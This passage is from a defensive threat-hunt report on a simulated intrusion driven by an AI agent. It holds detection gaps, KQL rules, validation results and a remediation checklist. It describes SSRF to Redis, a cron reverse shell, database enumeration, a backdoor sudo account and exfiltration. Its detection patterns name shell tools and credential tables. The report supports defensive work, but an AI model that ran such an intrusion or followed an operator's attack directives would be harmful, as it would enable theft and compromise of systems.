| summarize Count = count(), First = min(TimeGenerated) by SyslogMessage
| order by Count desc
```

</details>

---

## 🚨 Detection Gaps & Telemetry Gaps

### 🕳 Observed Detection Gaps

| Gap | Impact | Recommended Fix |
|-----|--------|----------------|
| Only the web requests alerted. Nothing fired on cron starting a Python shell as root | High | DR-01 |
| No alert on a service account reading whole tables and system catalogues | High | DR-02, plus session labelling the rule can join on |
| No alert on a backdoor account created and added to sudo by a shell | High | DR-03 |
| Outbound 443 from a root process to a first-time destination did not alert | High | Process-based egress rule (see S5.4) |
| A refused secrets request (403) from an unusual source did not alert | Medium | Alert on 403 to sensitive endpoints from new sources |

### 📉 Telemetry Gaps (questions the data cannot answer)

| Question | Table / source checked | Why it cannot be answered | Log change needed |
|----------|------------------------|---------------------------|-------------------|
| Did Redis write the crontab file, and where? | `Syslog` (no Redis process logged), `DeviceFileEvents_CL` (no rows 06:52:40 to 06:53:40) | Redis does not forward logs, and the cron file write was not captured | Forward Redis logs, monitor writes to cron directories |
| What did `env` return at 07:05:21? | `DeviceProcessEvents_CL`, `LLMAgentLogs_CL` | Command output is never recorded and the agent logged no `env` call | Audit `/proc/*/environ` reads, session recording |
| What was in the archive, and did the upload complete? | `DeviceFileEvents_CL`, `DeviceNetworkEvents_CL` | No file contents, no byte counts, no response from the destination | Proxy or packet logs with byte counts |
| What did `inspect_layer` return? | `ContainerRegistryLog_CL` | The log records the operation and resource, not the response | Registry audit with response size |
| Which client exhausted the database connections at 07:30? | `Syslog` (postgres) | `FATAL` lines carry no client address | Log connection attempts with the source |
| Which statement belonged to which database session? | `Syslog` joined on `ProcessID` | `ProcessID` did not separate sessions in this data | Add session ID and `application_name` to statement logs |
| Was `svc_monitor` ever used? | `DeviceLogonEvents_CL` not reviewed in this hunt | Not checked | Review logons for the account |

---

## 🛡 Detection Rules Built

Validation used the attack window (2026-09-20 06:30 to 08:30) and the lead-in baseline (2026-09-15 to 2026-09-20 06:30). Hits are de-duplicated (each event is logged twice in this data).

Rule files, Sentinel analytics rule YAML and the backtest queries are in the hunt folder under [detections/](https://github.com/CharlieMathe/Threat-Hunting/tree/main/Operation_QUARTZFANG/detections).

### Rule Summary

| Rule ID | Name | ATT&CK | Pyramid Tier | Severity | Status |
|---------|------|--------|--------------|----------|--------|
| DR-01 | Interpreter or shell started by cron on the portal | T1053.003, T1059.006 | TTP | High | Tested |
| DR-02 | Database enumeration statements | T1213.006 | TTP | High | Draft (baseline hits unresolved) |
| DR-03 | Account created or added to sudo by an interpreter | T1136.001, T1098 | TTP | High | Tested |

---

### DR-01: Interpreter or shell started by cron on the portal

| Field | Detail |
|-------|--------|
| **Purpose** | Catch a shell that cron starts from a file someone else wrote |
| **ATT&CK** | T1053.003, T1059.006 |
| **Data source** | `DeviceProcessEvents_CL`: `InitiatingProcessFileName`, `FileName`, `ProcessCommandLine` |
| **Linked flag(s)** | S1.4 |
| **Why this discriminator** | The exploit, payload and IP can change. Cron launching an interpreter on a web server is the behaviour that stays |

**Logic (plain English):** IF the parent is `cron` AND the child is python, perl, sh, bash or nc on `sc-portal01` THEN alert.

**KQL:**

```kql
// Scheduled form
DeviceProcessEvents_CL
| where Timestamp > ago(1h)
| where DeviceName =~ "sc-portal01"
| where InitiatingProcessFileName =~ "cron" and FileName in~ ("python3", "python", "perl", "sh", "bash", "nc")
| project Timestamp, DeviceName, AccountName, FileName, ProcessId, ProcessCommandLine
```

```kql
// Validation query as run
DeviceProcessEvents_CL
| where Timestamp between (datetime(2026-09-15 00:00:00) .. datetime(2026-09-21 00:00:00))
| where DeviceName =~ "sc-portal01"
| where InitiatingProcessFileName =~ "cron" and FileName in~ ("python3", "python", "perl", "sh", "bash", "nc")
| extend Period = case(Timestamp < datetime(2026-09-20 06:30:00), "baseline", Timestamp <= datetime(2026-09-20 08:30:00), "attack window", "after")
| summarize Hits = dcount(Timestamp), First = min(Timestamp) by Period
```

**Validation (real results only):**

| Test | Data used | Time range | Hits | True positives | False positives | Notes |
|------|-----------|------------|-----:|---------------:|----------------:|-------|
| Attack replay | Hunt data | 2026-09-20 06:30 to 08:30 | 1 | 1 | 0 | The reverse shell at 06:52:52 |
| Baseline noise | Lead-in, 1,219 process events | 2026-09-15 to 2026-09-20 06:30 | 0 | 0 | 0 | Routine cron jobs run their own binaries, not an interpreter |
| After the window | 359 process events | 2026-09-20 08:30 to 2026-09-21 | 0 | 0 | 0 | |

**Tuning decisions:** none needed in this data.
**Blind spots:** many real estates run every cron job through `/bin/sh -c`, which would flood this rule; there it needs a command-line filter (for example `-c` with `socket` or `connect`). A systemd timer or a compiled binary would not match.
**Next iteration:** add the command-line filter and test it on an estate where cron uses `sh -c`. Not tested here.

---

### DR-02: Database enumeration statements

| Field | Detail |
|-------|--------|
| **Purpose** | Catch whole-table reads and system catalogue reads on the production database |
| **ATT&CK** | T1213.006 |
| **Data source** | `Syslog` on `sc-db01`, `ProcessName` = `postgres`, `SyslogMessage` |
| **Linked flag(s)** | S3.1, S3.2 |
| **Why this discriminator** | The account and IP were shared with the application. Statement shape was not |

**Logic (plain English):** IF a statement reads `information_schema`, `pg_catalog`, `pg_shadow` or `password_hash`, OR is a bare `SELECT * FROM table` THEN alert.

**KQL:**

```kql
// Validation query as run
Syslog
| where TimeGenerated between (datetime(2026-09-15 00:00:00) .. datetime(2026-09-21 00:00:00))
| where Computer =~ "sc-db01" and ProcessName =~ "postgres"
| where SyslogMessage startswith "statement:"
| where SyslogMessage has_any ("information_schema", "pg_catalog", "pg_shadow", "password_hash") or SyslogMessage matches regex @"(?i)statement:\s*SELECT \* FROM \w+\s*$"
| extend Period = case(TimeGenerated < datetime(2026-09-20 06:30:00), "baseline", TimeGenerated <= datetime(2026-09-20 08:30:00), "attack window", "after")
| summarize Hits = dcount(TimeGenerated), First = min(TimeGenerated), Stmts = dcount(SyslogMessage) by Period
```

**Validation (real results only):**

| Test | Data used | Time range | Hits | True positives | False positives | Notes |
|------|-----------|------------|-----:|---------------:|----------------:|-------|
| Attack replay | Hunt data | 2026-09-20 06:30 to 08:30 | 6 | 6 | 0 | 6 distinct statements: the 07:16 burst plus the `password_hash` read at 07:45 |
| Baseline noise | Lead-in | 2026-09-15 to 2026-09-20 06:30 | 4 | Unresolved | Unresolved | The same 6 statements at 2026-09-19 23:12:32 and 23:13:56 |

**The unresolved baseline burst:** the connection at 23:12:32 on 19 Sep was `user=portal_svc ... application_name=portal_svc host=10.5.0.10`, which is the application's label. It could be a scheduled report, an admin task, a test artefact in the lead-in data, or earlier attacker activity. Nothing in the hunt proves which, so it is neither counted as a true positive nor dismissed.

**Tuning decisions:** I tried to require a missing `application_name` by joining statements to their connection line on `ProcessID`. It failed: both labelled and unlabelled connections joined to the same statements, so `ProcessID` does not identify a session in this data.
**Blind spots:** the targeted 07:45 statements with explicit columns (projects and customers) did not match. An attacker who names columns and avoids catalogues passes.
**Next iteration:** get session IDs into the statement log, then add the `application_name` condition and a burst threshold (4 or more matches in 60 seconds).

---

### DR-03: Account created or added to sudo by an interpreter

| Field | Detail |
|-------|--------|
| **Purpose** | Catch backdoor accounts made from a shell rather than by an administrator |
| **ATT&CK** | T1136.001, T1098 |
| **Data source** | `DeviceProcessEvents_CL`: `FileName`, `InitiatingProcessFileName` |
| **Linked flag(s)** | S5.3 |
| **Why this discriminator** | The account name will change. The parent of `useradd` is much harder to change |

**Logic (plain English):** IF `useradd`, `adduser` or `usermod` runs with a parent of python, perl, sh or cron THEN alert.

**KQL:**

```kql
// Scheduled form
DeviceProcessEvents_CL
| where Timestamp > ago(1h)
| where FileName in~ ("useradd", "adduser", "usermod")
| where InitiatingProcessFileName in~ ("python3", "python", "perl", "sh", "cron")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
```

**Validation (real results only):**

| Test | Data used | Time range | Hits | True positives | False positives | Notes |
|------|-----------|------------|-----:|---------------:|----------------:|-------|
| Attack replay | Hunt data | 2026-09-20 06:30 to 08:30 | 2 | 2 | 0 | `useradd` and `usermod -aG sudo` for `svc_monitor` |
| Baseline noise | Lead-in, 1,219 process events | 2026-09-15 to 2026-09-20 06:30 | 0 | 0 | 0 | No account tools ran in the baseline |

**Tuning decisions:** none needed in this data.
**Blind spots:** editing `/etc/passwd` directly, or creating the account from a parent not in the list.
**Next iteration:** add file events on `/etc/passwd`, `/etc/sudoers` and `authorized_keys`.

---

## 🛠 Remediation & Containment Checklist

### 🔴 Immediate Actions (0 to 4 hours)

- [ ] Isolate `sc-portal01` from the network
- [ ] Kill the reverse shell (python3 PID 4401) and remove the cron entry that started it
- [ ] Delete `svc_monitor`, remove `/home/svc_monitor/.ssh` and check every `authorized_keys` file
- [ ] Block `203.0.113.87`, `198.51.100.210` and `198.51.100.31`, `.45`, `.62` at the firewall
- [ ] Preserve forensic images before changing anything
- [ ] Notify legal and compliance: customer contact details and password hashes were read

### 🟠 Short Term (4 to 24 hours)

- [ ] Rotate `portal_svc` and `ci-builder` in a planned change with the application and CI owners (revoking without a plan takes the portal down)
- [ ] Treat secrets in the portal's environment as exposed and rotate them
- [ ] Force password resets for portal users whose hashes were read, and review PostgreSQL role passwords (`pg_shadow`)
- [ ] Remove `/tmp/.portal-cache/`
- [ ] Fix the preview feature: allow only `https://` to approved domains, block internal addresses
- [ ] Lock down Redis: bind to localhost with a password, disable `CONFIG`, run as a non-root user
- [ ] Confirm the `db_admin` credential claimed by the agent does not exist

### 🟡 Medium Term (1 to 7 days)

- [ ] Rebuild `sc-portal01` from a clean image (the attacker had root)
- [ ] Move secrets from `portal.conf` into a secrets store
- [ ] Give each service its own narrow account
- [ ] Deploy and tune DR-01 to DR-03
- [ ] Forward Redis logs and monitor writes to cron directories

### 🔵 Long Term (1 to 4 weeks)

- [ ] Purple team exercise replaying SSRF to Redis to cron
- [ ] Add agent-driven intrusion (tempo, narration, approvals) to the incident response playbook
- [ ] Brief the CISO and board

---

## 🧾 Final Assessment

### Risk Conclusion

This was a targeted, operator-guided intrusion carried out at machine speed by an AI agent. It used well-known techniques: an SSRF to an internal Redis, a cron entry, credentials in a configuration file and valid accounts. It gained root on the portal within seconds of the exploit, read the user, project and customer tables, browsed the container registry, staged and sent an encrypted archive, and left a sudo account with an SSH key. One control worked: the admin API refused the secrets request.

Confidence in the chain is high where two or more independent tables agree: the web request, the cron command, the process tree and the network connections all point to the same root process, PID 4401. Confidence is lower on what left the network, because the archive's contents and the transfer's completion are not visible, and on the Redis step, which is inferred. The attacker can return through `svc_monitor` unless it is removed, and possibly through the stolen credentials until they are rotated.

The defining lesson is that the attacker's own agent log is valuable but not trustworthy. It recorded the operator's five directives and the agent's reasoning, and it also recorded two extractions that the infrastructure does not support. Scoping the response from telemetry rather than from the agent's narration keeps it accurate.

### Evidence Quality Rating

| Evidence Type | Quality | Notes |
|--------------|---------|-------|
| Process execution logs | 🟢 High | Full command lines and parent PIDs. No hashes. Duplicate rows |
| Network telemetry | 🟡 Medium | Destinations, ports and PIDs. No account field, no byte counts |
| Authentication / audit logs | 🟡 Medium | Database connection lines and account events. Statements cannot be joined to sessions |
| File activity | 🟡 Medium | Archive creation seen. The cron file write by Redis is missing |
| Application / agent logs | 🟡 Medium | Rich reasoning and directives, but stamped with the upload date and containing false claims |

### Confidence Assessment

| Finding | Confidence |
|---------|-----------|
| Initial access vector | 🟢 High: access log, syslog and process tree agree |
| Lateral movement path | 🟢 High: every connection from PID 4401, confirmed on each target |
| Data accessed / impacted | 🟡 Medium: tables queried are certain, archive contents unknown |
| Attacker identity | 🔴 Low: infrastructure only, no attribution |
| Full scope of access | 🟡 Medium: two claimed extractions disproved or unsupported, environment variables unknown |

---

## 🔧 What I'd Improve

### Improvement 1: Verify before concluding (linked to Flags S1.4, S3.2, S4.2 and DR-02)

| | |
|---|---|
| **1. What didn't work as well as it should** | Some conclusions rested on the first query that looked right. In some places the answer was in the data but hidden in a field I had not projected: `inspect_layer` only showed it was a vulnerability report request once I added the `Resource` column. In others there was no proof at all: Redis writing the cron file, the second database wave at 07:45, and the identical statements on 19 Sep at 23:12. There I had to infer, or leave the question open |
| **2. Why that matters** | A conclusion from one query can be wrong in either direction. I could report something the attacker never did, such as a leaked admin credential, or miss something that is sitting in the logs. An inference written like a fact also sends the incident team in the wrong direction |
| **3. What I'd do next time** | Run at least one verification query per finding from a second table or field (process, network, file or service log). Project every field that says what an operation touched. Label each finding as observed, inferred or unknown. For example, the next query on the 19 Sep burst is portal process and network activity at 23:12: if there is none, those rows did not come from the attacker's shell |

### Improvement 2: Reading the wrong port (linked to Flag S5.1)

| | |
|---|---|
| **1. What didn't work as well as it should** | I first gave `198.51.100.210:51240` as the exfiltration destination. 51240 was the local ephemeral port; the destination was 443 |
| **2. Why that matters** | The wrong port would go into firewall blocks and the IOC list and miss the real channel |
| **3. What I'd do next time** | Always read `RemotePort` for the destination and sanity-check it against the protocol (outbound HTTPS is 443) |

---

*Report generated by: Károly Mathe | 2026-11-02 | Log(n) Pacific*
*Scenario: reproduces Campaign C0062 from public research by Anthropic and MITRE. Hosts, users and data are simulated.*
